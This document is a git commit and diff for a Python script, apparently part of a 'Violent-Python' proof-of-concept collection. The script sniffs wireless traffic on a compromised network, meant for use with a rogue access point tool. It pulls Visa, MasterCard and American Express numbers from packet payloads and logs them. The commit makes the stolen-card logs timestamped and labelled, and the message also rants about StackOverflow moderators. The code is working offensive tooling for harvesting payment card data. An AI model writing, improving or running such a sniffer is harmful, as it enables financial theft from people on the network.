413ed597aa8147c0799f1527e82507aed691cfa8
Smoke Jaguar <tanc7@unlv.nevada.edu>
2017-04-03 10:11:50 -0700

    Major logfile overwrite bug fixed
    The solution I used to help retain your saved logfiles is simply taking the current date and time, and appending that to your logfile so it wont get overwritten. 
    
    Also, I hate StackOverflow for tyrannic moderators and butthurt answerers that get mad at the person who asked a question because their solution didn't work (and therefore didn't as much upvotes).
    
    I never even had a SO account, but from what I have seen since I started learning Python just by Googling, I don't want to deal with SO longer than I should.

--- Violent-Python-POCs/wirelessCreditCardsniffer.py
+++ Violent-Python-POCs/wirelessCreditCardsniffer.py
@@ -2,11 +2,19 @@ import re
 import optparse
 from scapy.all import *
 from sys import argv
+import time
+
 # this sniffs for credit card info
 # INSIDE of a compromised wireless networtk (little or no security)
 # supposed to be used in conjunction with Mana
 
-saved_Creds = open("/root/ArmsCommander/logs/CreditCard_Captured_Creds.txt", 'w')
+# Gets current date and time to use as a timestring
+timestr = time.strftime("%Y%m%d-%H%M%S")
+
+basic_Filename = "/root/ArmsCommander/logs/CreditCard_Captured_Creds_"
+modified_Filename = basic_Filename + timestr + '.txt'
+
+saved_Creds = open(modified_Filename, 'w')
 
 def findCreditCard(pkt):
     raw = pkt.sprintf('%Raw.load%')
@@ -15,13 +23,13 @@ def findCreditCard(pkt):
     visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)
     if americaRE:
         print '[+] Found American Express Card: ' + americaRE[0]
-        saved_Creds.write(americaRE[0])
+        saved_Creds.write('American Express: ' + americaRE[0] + '\n\r')
     if masterRE:
         print '[+] Found MasterCard Card: ' + masterRE[0]
-        saved_Creds.write(masterRE[0])
+        saved_Creds.write('MasterCard: ' + masterRE[0] + '\n\r')
     if visaRE:
         print '[+] Found Visa Card: ' + visaRE[0]
-        saved_Creds.write(visaRE[0])
+        saved_Creds.write('VISA: ' + visaRE[0] + '\n\r')
 
 def main():
     parser = optparse.OptionParser('usage % prog -i <interface>')
